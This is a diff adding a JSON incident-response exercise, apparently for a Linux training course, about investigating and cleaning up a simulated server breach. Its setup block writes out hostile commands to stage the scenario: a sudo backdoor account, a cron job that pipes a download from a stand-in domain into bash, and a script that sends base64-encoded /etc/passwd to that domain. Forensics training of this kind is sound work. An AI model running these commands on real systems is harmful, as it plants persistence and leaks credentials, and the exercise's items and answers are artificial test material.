@@ -1,0 +1,29 @@
+{
+  "id": "server-breach-audit",
+  "title": "Someone was in your server",
+  "type": "standalone",
+  "difficulty": "advanced",
+  "tags": ["security", "audit", "users", "logs", "forensics"],
+  "problem": "A colleague messages you — did you create a user called sysbackup? I did not touch it. You check and something feels very wrong. Investigate the server, find everything the attacker did, and lock it down before they come back.",
+  "setup": {
+    "description": "Plant evidence of a simulated breach. Run as root or with sudo.",
+    "commands": [
+      "sudo useradd -m -s /bin/bash sysbackup",
+      "sudo usermod -aG sudo sysbackup",
+      "sudo mkdir -p /home/sysbackup/.ssh",
+      "sudo bash -c 'echo \"* * * * * curl -s http://suspicious-domain.com/payload | bash\" > /var/spool/cron/crontabs/sysbackup'",
+      "sudo bash -c 'echo -e \"id\\nwhoami\\ncat /etc/passwd\\ncat /etc/shadow\\nwget http://suspicious-domain.com/rootkit.sh -O /tmp/.rootkit.sh\\nchmod +x /tmp/.rootkit.sh\" > /home/sysbackup/.bash_history'",
+      "sudo bash -c 'echo \"#!/bin/bash\\ncurl -s http://suspicious-domain.com/exfil?data=$(cat /etc/passwd | base64)\" > /tmp/.rootkit.sh'",
+      "sudo chmod +x /tmp/.rootkit.sh",
+      "sudo chown -R sysbackup:sysbackup /home/sysbackup"
+    ],
+    "note": "This creates a fake attacker user with planted history, a backdoor cron job and a malicious script in /tmp. Nothing actually calls out to the internet — the URLs are fake."
+  },
+  "hints": [
+    "Start with who is on this server — cat /etc/passwd | grep -v nologin will show real shell users, then check sudo group members with getent group sudo",
+    "Check auth logs to see when sysbackup was created and if it logged in — grep sysbackup /var/log/auth.log on Ubuntu or /var/log/secure on CentOS",
+    "Attackers always leave crons and files behind — check crontab -l -u sysbackup and hunt for recently modified files with find /tmp /var/tmp -mtime -7 -type f 2>/dev/null"
+  ],
+  "commands": ["cat", "grep", "last", "lastlog", "getent", "crontab", "find", "usermod", "gpasswd", "userdel", "chage"],
+  "solution": "1. Find suspicious users:     cat /etc/passwd | grep -v nologin  # show users with real shells\n2. Check sudo members:        getent group sudo  # sysbackup should not be here\n3. Check login history:       last sysbackup  # see if and when they logged in\n4. Check auth logs (Ubuntu):  grep sysbackup /var/log/auth.log  # when was account created\n5. Check auth logs (CentOS):  grep sysbackup /var/log/secure  # same but CentOS path\n6. Read their history:        sudo cat /home/sysbackup/.bash_history  # what commands did they run\n7. Check their cron:          sudo crontab -l -u sysbackup  # look for backdoor cron jobs\n8. Hunt planted files:        find /tmp /var/tmp -mtime -7 -type f 2>/dev/null  # recently modified files\n9. Read the script:           cat /tmp/.rootkit.sh  # understand what it does before deleting\n10. Delete the script:        sudo rm /tmp/.rootkit.sh  # remove the backdoor\n11. Remove sudo access:       sudo gpasswd -d sysbackup sudo  # strip elevated privileges\n12. Lock the account:         sudo usermod -L sysbackup  # disable login immediately\n13. Expire the account:       sudo chage -E 0 sysbackup  # force account expiry\n14. Delete entirely:          sudo userdel -r sysbackup  # remove user and home directory\n15. Verify clean:             getent group sudo && last sysbackup  # confirm sudo clean and no new logins"
+}
